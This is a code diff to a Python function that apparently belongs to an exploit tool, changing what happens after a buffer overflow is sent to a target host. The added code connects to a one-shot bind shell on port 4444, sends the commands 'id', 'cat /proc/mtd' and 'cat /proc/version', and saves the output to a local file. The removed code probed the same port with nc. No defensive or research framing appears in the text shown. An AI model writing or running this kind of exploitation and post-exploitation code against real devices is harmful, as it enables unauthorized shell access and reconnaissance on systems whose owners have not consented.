@@ -211,13 +211,37 @@ def guarded_fire(host: str, args, mac: str | None = None) -> int:
     ok = "raw" not in r
     print("%.2fs %s" % (time.time() - t0, json.dumps(r)[:200]), flush=True)
     if not ok:
-        # empty reply = the overflow ran; probe once for the shell and stop.
-        time.sleep(1)
-        p = subprocess.run(["nc", "-z", "-G2", host, "4444"], capture_output=True)
-        if p.returncode == 0:
-            print("SHELL on %s:4444" % host)
-            return 0
-        print("no shell; DECODE-BUFFER zone likely (stop here, do not retry)")
+        # empty reply = the overflow ran; connect and run recon immediately.
+        # do NOT use nc -z — it consumes the one-shot bind shell connection.
+        time.sleep(2)
+        try:
+            s = socket.create_connection((host, 4444), timeout=5)
+            s.settimeout(5)
+            print("SHELL on %s:4444 — connected, running recon" % host, flush=True)
+            recon = b""
+            for cmd in ["id", "cat /proc/mtd", "cat /proc/version"]:
+                s.sendall((cmd + "\n").encode())
+                time.sleep(2)
+                try:
+                    while True:
+                        chunk = s.recv(4096)
+                        if not chunk: break
+                        recon += chunk
+                except socket.timeout:
+                    pass
+            s.close()
+            if recon:
+                outfile = "/tmp/pane1/%s/recon_auto.txt" % host
+                import os
+                os.makedirs(os.path.dirname(outfile), exist_ok=True)
+                with open(outfile, "wb") as f:
+                    f.write(recon)
+                print("RECON saved to %s (%d bytes)" % (outfile, len(recon)))
+                print(recon.decode(errors="replace")[:400])
+            else:
+                print("SHELL connected but no output from commands")
+        except (ConnectionRefusedError, socket.timeout, OSError) as e:
+            print("no shell; DECODE-BUFFER zone likely (%s)" % e)
     return 0 if ok else 1
 
 
